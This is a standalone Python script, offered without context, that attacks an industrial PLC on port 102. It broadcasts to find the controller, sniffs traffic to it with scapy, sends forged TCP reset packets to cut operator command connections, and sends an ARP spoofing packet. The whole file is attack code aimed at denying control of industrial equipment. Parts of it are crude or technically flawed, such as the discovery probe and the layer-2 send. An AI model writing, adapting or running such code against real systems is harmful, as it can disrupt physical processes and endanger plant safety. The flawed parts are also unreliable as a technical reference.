import socket
import struct
import scapy.all as scapy
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether, ARP

# Define the PLC's IP address and port
plc_ip = None
plc_port = 102

# Function to scan the network for the PLC's IP address
def find_plc_ip():
    global plc_ip
    # Send a broadcast message to the network to find the PLC
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.sendto(b"Hello, PLC!", ("255.255.255.255", plc_port))
    # Listen for a response from the PLC
    sock.settimeout(1)
    try:
        data, addr = sock.recvfrom(1024)
        plc_ip = addr[0]
        print(f"Found PLC at IP address {plc_ip}")
    except socket.timeout:
        print("No PLC found on the network")
    sock.close()

# Function to block command messages from reaching the PLC
def block_command_messages():
    global plc_ip
    if plc_ip is not None:
        # Create a packet sniffer to capture command messages
        packet_sniffer = scapy.sniff(filter=f"host {plc_ip} and port {plc_port}", count=100)
        # Iterate over the captured packets
        for packet in packet_sniffer:
            # Check if the packet is a command message
            if packet.haslayer(TCP) and packet[TCP].dport == plc_port:
                # Block the command message by sending a TCP RST packet
                tcp_rst_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="R")
                scapy.send(tcp_rst_packet, verbose=0)
                print(f"Blocked command message from {packet[IP].src} to {packet[IP].dst}")
    else:
        print("PLC IP address not found")

# Function to implement ARP spoofing to block command messages
def arp_spoofing():
    global plc_ip
    if plc_ip is not None:
        # Create an ARP spoofing packet
        arp_spoofing_packet = Ether(src="00:11:22:33:44:55", dst="00:66:77:88:99:00")/ARP(psrc="192.168.1.100", pdst=plc_ip, hwdst="00:66:77:88:99:00")
        # Send the ARP spoofing packet
        scapy.send(arp_spoofing_packet, verbose=0)
        print(f"Sent ARP spoofing packet to {plc_ip}")
    else:
        print("PLC IP address not found")

# Main function
def main():
    find_plc_ip()
    block_command_messages()
    arp_spoofing()

if __name__ == "__main__":
    main()